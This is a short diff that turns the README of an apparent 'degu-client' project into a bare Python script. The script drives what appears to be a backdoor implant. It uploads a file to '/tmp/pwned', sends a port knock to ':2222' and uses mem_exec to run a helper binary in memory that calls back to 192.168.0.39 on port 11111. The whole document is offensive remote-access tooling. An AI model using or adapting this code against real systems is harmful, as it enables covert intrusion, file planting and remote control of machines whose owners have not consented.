@@ -1,7 +1,3 @@
-# degu-client
-degu client part
-
-```
 #!/usr/bin/env python
 import degu
 import time
@@ -24,4 +20,4 @@ aa=d.upload(b"/tmp/a",b"/tmp/pwned")
 d.knock(b":2222")
 time.sleep(2)
 aa=d.mem_exec("../helper/cb",b"DEGU 192.168.0.39 11111 ")
-```
+
